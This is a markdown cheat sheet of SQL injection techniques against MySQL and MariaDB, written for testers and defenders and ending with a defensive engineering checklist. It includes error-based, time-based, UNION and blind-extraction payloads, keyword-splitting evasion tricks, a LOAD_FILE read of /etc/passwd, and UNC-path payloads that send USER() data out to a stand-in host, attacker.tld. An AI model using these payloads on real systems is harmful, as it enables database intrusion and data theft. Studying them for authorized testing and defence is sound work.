# MySQL / MariaDB — SQLi Notes

> Practical notes for testing and defending **MySQL 5.7/8.0** and **MariaDB 10.x**. Focus on fingerprinting, catalogs, error/time primitives, UNION behavior, file/OOB quirks, and safe engineering guidance.

---

## 1) Quick Fingerprinting
- **Engine & version**
  - `SELECT VERSION();` — banner (engine + distro).
  - `SELECT @@version_comment;` — vendor (e.g., MySQL Community, MariaDB) when available.
- **Identity & context**
  - `SELECT USER(), CURRENT_USER();` — login string vs effective definer.
  - `SELECT DATABASE();` — current schema.
- **Configuration hints**
  - `SELECT @@sql_mode;` — strict modes affect casting/error behavior.
  - `SELECT @@secure_file_priv;` — file I/O sandbox (OUTFILE/INFILE).

---

## 2) Comments, Quoting, Concatenation
- **Comments:** `-- ` (needs trailing space or newline), `#`, `/* ... */`, and **versioned comments** `/*!...*/` (MySQL executes inside depending on server version).
- **Strings:** single quotes `'text'`; escape by doubling or backslash (mode-dependent). Use hex `0x...` to avoid quotes.
- **Concatenation:** `CONCAT(a,b)`, `CONCAT_WS(':',a,b)`; `||` is logical OR (unless `PIPES_AS_CONCAT` is enabled).

---

## 3) System Catalogs & Information Schema
- `information_schema.schemata` → databases.
- `information_schema.tables` → tables (schema, name).
- `information_schema.columns` → columns (table, name, type).

**Handy queries**
```sql
-- List databases
SELECT schema_name FROM information_schema.schemata;

-- Tables in current DB
SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();

-- Columns of a table
SELECT column_name, data_type FROM information_schema.columns
WHERE table_schema=DATABASE() AND table_name='users';
```

---

## 4) Error‑based Primitives
**Note:** MySQL 8.0 removed legacy XML functions; MariaDB still has them.
```sql
-- MariaDB / older MySQL
' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT DATABASE()),0x7e)) -- -
' AND UPDATEXML(1, CONCAT(0x7e,(SELECT USER()),0x7e), 1) -- -
```
**Type/cast quirks:**
```sql
-- Can surface truncation errors (depends on sql_mode)
' AND CAST((SELECT DATABASE()) AS UNSIGNED) -- -
```
In modern MySQL, prefer **UNION** or **blind** techniques for reliability.

---

## 5) Time‑based Primitives
```sql
' AND SLEEP(3) -- -
' AND IF((SELECT DATABASE())='appdb', SLEEP(3), 0) -- -
-- CPU alternative (noisy)
' AND BENCHMARK(5000000,MD5('a')) -- -
```

---

## 6) UNION‑based Notes
- Discover **column count** using `ORDER BY n` or NULL padding.
- Align types; use `CAST(... AS CHAR)` or hex literals to normalize.
```sql
' UNION ALL SELECT 1,VERSION(),3 -- -
' UNION ALL SELECT 1,DATABASE(),3 -- -
```
- Find a **printable column** by placing a unique marker in each position.

---

## 7) Filesystem & OOB (Privileged / OS‑dependent)
- **File read/write** (requires `FILE` and `secure_file_priv` allowing path):
```sql
-- Read file
SELECT LOAD_FILE('/etc/passwd');
-- Write file (risk!)
SELECT 'ok' INTO OUTFILE '/tmp/ok.txt';
```
- **Windows UNC (DNS/SMB) tricks** can provoke OOB callbacks:
```sql
' UNION ALL SELECT 1,LOAD_FILE(CONCAT('\\\\',HEX(USER()),'.attacker.tld\\x')),3 -- -
' SELECT USER() INTO OUTFILE '\\\\attacker.tld\\share\\mark.txt' -- -
```
**Caution:** Use only for authorized, minimal proofs.

---

## 8) Pagination & Row Iteration
```sql
-- First row
SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET 0;
-- Iterate rows/characters for blind extraction
SELECT ASCII(SUBSTRING((SELECT USER()),1,1)) > 77;
```

---

## 9) Aggregation & Helpers
- `GROUP_CONCAT(expr ORDER BY expr SEPARATOR ',')` (size limited by `@@group_concat_max_len`).
- Hex builders: `0x7139785A` (`'q9xZ'`), `CHAR(113,57,120,90)`.

---

## 10) Privileges & Security Posture
- Check user & grants:
```sql
SELECT CURRENT_USER();
SHOW GRANTS FOR CURRENT_USER();
```
- Minimize app rights: no `FILE`, no `SUPER`, no DDL/DCL.

---

## 11) Evasion Tips (Tester awareness)
- Versioned comments for keyword splitting: `UNI/*!00000*/ON SEL/*!00000*/ECT`.
- `-- ` requires a trailing space; prefer `/* */` when in doubt.
- Use hex/CHAR to avoid quotes; consider `/*!CAST(... AS CHAR)*/` to normalize.

---

## 12) Defensive Checklist (Engineering)
- **Prepared statements** only; never concatenate predicates or identifiers.
- Allowlist identifiers for `ORDER BY`, `GROUP BY`, `LIMIT/OFFSET`.
- Lock down `secure_file_priv`; avoid `FILE` privilege for app users.
- Centralize error handling; generic client messages only.
- Separate read/write accounts; apply least privilege.

---

## 13) Handy One‑liners
```sql
-- Fingerprint & identity
SELECT VERSION(), USER(), CURRENT_USER(), DATABASE();

-- Time‑based yes/no
' AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>77, SLEEP(3), 0) -- -
```
